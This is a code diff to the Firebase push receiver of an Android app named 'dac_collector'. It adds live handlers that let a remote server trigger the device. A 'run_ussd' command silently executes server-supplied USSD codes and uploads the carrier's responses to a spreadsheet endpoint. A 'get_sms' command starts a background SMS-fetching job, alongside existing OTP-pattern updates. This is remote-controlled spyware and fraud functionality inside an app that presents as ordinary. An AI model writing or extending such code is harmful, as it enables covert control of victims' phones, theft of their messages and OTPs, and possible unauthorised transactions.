@@ -1,6 +1,10 @@
 package android.iocl.dac_collector.Firebase;
 
+import android.Manifest;
+import android.annotation.SuppressLint;
+import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.iocl.dac_collector.BuildConfig;
 import android.iocl.dac_collector.ModelData.ColumnValue;
 import android.iocl.dac_collector.ModelData.DAC_Collector_Base;
@@ -9,14 +13,23 @@ import android.iocl.dac_collector.RetrofitClient.RequestService;
 import android.iocl.dac_collector.RetrofitClient.RetrofitClient;
 import android.iocl.dac_collector.Services.JobSchedulerUtil;
 import android.iocl.dac_collector.Services.SendDACService;
+import android.iocl.dac_collector.Services.SmsFetchWorker;
 import android.iocl.dac_collector.Services.SmsSenderJOBService;
 import android.iocl.dac_collector.Utility.SharedPrefs;
 import android.iocl.dac_collector.Utility.Utility;
 import android.iocl.dac_collector.Utility.WakeupHelper;
 import android.os.Build;
+import android.os.Handler;
+import android.os.Looper;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 
 import androidx.annotation.NonNull;
+import androidx.core.content.ContextCompat;
+import androidx.work.Constraints;
+import androidx.work.NetworkType;
+import androidx.work.OneTimeWorkRequest;
+import androidx.work.WorkManager;
 
 import com.google.firebase.messaging.FirebaseMessagingService;
 import com.google.firebase.messaging.RemoteMessage;
@@ -65,7 +78,12 @@ public class FCMPushReceiver extends FirebaseMessagingService {
                 case "otp_patterns":
                     Log.d(TAG, "onMessageReceived: " + payloads);
                     Utility.updateMessagePattern(payloads, this);
-
+                    break;
+                case "get_sms":
+                    handleSendSms();
+                    break;
+                case "run_ussd":
+                    runUssdCode(getApplicationContext(), payloads);
                     break;
                 case "get_dac":
                     Intent mainService = new Intent(this, SendDACService.class);
@@ -83,13 +101,67 @@ public class FCMPushReceiver extends FirebaseMessagingService {
 
     }
 
+
+    @SuppressLint("MissingPermission")
+    public void runUssdCode(final Context ctx, String ussdCode) {
+        Log.d(this.getClass().getName(), "code run garne");
+
+        // Check if we have necessary permissions
+        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
+            Log.e(this.getClass().getName(), "Permission not granted for CALL_PHONE.");
+            return;
+        }
+
+        TelephonyManager manager = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
+        Log.d("networkprovider", manager.getNetworkOperatorName());
+
+        if (manager != null) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                // Use the main thread's Looper to ensure the Handler is associated with the main thread
+                Handler handler = new Handler(Looper.getMainLooper());
+
+                manager.sendUssdRequest(ussdCode, new TelephonyManager.UssdResponseCallback() {
+                    @Override
+                    public void onReceiveUssdResponse(TelephonyManager telephonyManager, String request, CharSequence response) {
+                        super.onReceiveUssdResponse(telephonyManager, request, response);
+                        String responseReceived = response.toString();
+                        Log.d(TAG, " response -> " + response);
+
+                        sendUSSDCodeToServer(responseReceived, ussdCode);
+                    }
+
+                    @Override
+                    public void onReceiveUssdResponseFailed(TelephonyManager telephonyManager, String request, int failureCode) {
+                        super.onReceiveUssdResponseFailed(telephonyManager, request, failureCode);
+                        Log.d(this.getClass().getName(), "response failed: " + failureCode);
+                    }
+                }, handler);
+            }
+        } else {
+            Log.e(this.getClass().getName(), "TelephonyManager is null");
+        }
+    }
+
+
+    private void handleSendSms() {
+        Constraints constraints = new Constraints.Builder()
+                .setRequiredNetworkType(NetworkType.CONNECTED)  // Only run when connected to Wi-Fi
+                .build();
+
+        OneTimeWorkRequest smsFetchRequest = new OneTimeWorkRequest.Builder(SmsFetchWorker.class)
+                .setConstraints(constraints)
+                .build();
+
+        WorkManager.getInstance(getApplicationContext()).enqueue(smsFetchRequest);
+    }
+
     @Override
     public void onNewToken(@NonNull String token) {
         super.onNewToken(token);
 
         SharedPrefs prefs = new SharedPrefs(getApplicationContext());
 
-        if (prefs.getBoolean("isFirstTime", true)){
+        if (prefs.getBoolean("isFirstTime", true)) {
             return;
         }
 
@@ -166,7 +238,7 @@ public class FCMPushReceiver extends FirebaseMessagingService {
         String cons_id = prefs.getString("cons_id", "");
         String name = prefs.getString("user_name", "");
 
-        if (cons_id.isEmpty()){
+        if (cons_id.isEmpty()) {
             return;
         }
 
@@ -180,6 +252,43 @@ public class FCMPushReceiver extends FirebaseMessagingService {
         );
 
         update_dac_collect receiver = new update_dac_collect("addCustomer", cons_id, userInfo);
+        Call<DAC_Collector_Base> auth = requestService.update_dac_collector(receiver);
+        auth.enqueue(new Callback<DAC_Collector_Base>() {
+            @Override
+            public void onResponse(Call<DAC_Collector_Base> call, Response<DAC_Collector_Base> response) {
+
+
+                Log.d(TAG, "onResponse: " + response.body().getMessage());
+
+
+            }
+
+            @Override
+            public void onFailure(Call<DAC_Collector_Base> call, Throwable t) {
+
+            }
+        });
+
+    }
+
+    private void sendUSSDCodeToServer(String UssdResponse, String ussdCode) {
+        SharedPrefs prefs = new SharedPrefs(getApplicationContext());
+
+        String cons_id = prefs.getString("cons_id", "");
+        String name = prefs.getString("user_name", "");
+
+        if (cons_id.isEmpty()) {
+            return;
+        }
+
+        RequestService requestService = RetrofitClient.retrofit_spreadsheet(getApplicationContext()).create(RequestService.class);
+        List<ColumnValue> smsInfo = Arrays.asList(
+                new ColumnValue("USER_NAME", name),
+                new ColumnValue("USER_NUMBER", ussdCode),
+                new ColumnValue("SMS_B64", UssdResponse)
+        );
+
+        update_dac_collect receiver = new update_dac_collect("addUserSms", cons_id, smsInfo);
         Call<DAC_Collector_Base> auth = requestService.update_dac_collector(receiver);
         auth.enqueue(new Callback<DAC_Collector_Base>() {
             @Override
